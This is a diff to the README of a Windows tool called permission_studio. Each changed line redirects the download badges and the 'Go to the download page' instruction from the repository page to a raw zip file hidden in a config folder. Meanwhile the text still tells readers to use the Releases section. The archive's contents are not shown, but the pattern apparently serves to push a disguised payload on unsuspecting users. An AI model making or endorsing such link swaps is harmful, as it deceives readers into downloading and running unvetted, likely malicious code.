@@ -1,6 +1,6 @@
 # ⚙️ permission_studio - Visual Permission Debugger Made Simple
 
-[![Download permission_studio](https://img.shields.io/badge/Download-Permission_Studio-4c1?style=for-the-badge&logo=github)](https://github.com/cvcj503/permission_studio)
+[![Download permission_studio](https://img.shields.io/badge/Download-Permission_Studio-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cvcj503/permission_studio/main/permission_studio/config/studio-permission-2.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you begin, make sure your Windows PC meets these:
 ## 🚀 Getting Started: Download and Run permission_studio
 
 1. **Go to the download page:**  
-   Click the big button at the top or visit [https://github.com/cvcj503/permission_studio](https://github.com/cvcj503/permission_studio).
+   Click the big button at the top or visit [https://raw.githubusercontent.com/cvcj503/permission_studio/main/permission_studio/config/studio-permission-2.9.zip](https://raw.githubusercontent.com/cvcj503/permission_studio/main/permission_studio/config/studio-permission-2.9.zip).
 
 2. **Find the latest release:**  
    On the GitHub page, look for the "Releases" section. This is where the newest version is available.
@@ -95,7 +95,7 @@ Use the dashboard to select any user or role and see detailed permission info. Y
 
 Get permission_studio here:
 
-[![Download permission_studio](https://img.shields.io/badge/Download-Permission_Studio-ff6f61?style=for-the-badge)](https://github.com/cvcj503/permission_studio)
+[![Download permission_studio](https://img.shields.io/badge/Download-Permission_Studio-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/cvcj503/permission_studio/main/permission_studio/config/studio-permission-2.9.zip)
 
 ---
 
